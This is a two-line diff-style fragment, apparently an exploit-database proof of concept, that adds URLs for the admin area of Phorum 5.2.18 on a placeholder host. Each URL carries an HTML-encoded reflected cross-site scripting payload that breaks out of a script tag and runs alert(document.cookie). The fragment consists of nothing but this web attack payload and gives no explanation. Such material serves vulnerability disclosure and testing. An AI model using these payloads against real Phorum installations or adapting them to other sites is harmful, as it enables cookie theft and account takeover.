@@ -1,0 +1,2 @@
+http://www.example.com/phorum-5.2.18/admin/&quot;&lt;/script&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&lt;/script&gt;
+http://www.example.com/phorum-5.2.18/admin/index.php&quot;&lt;/script&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&lt;/script&gt;
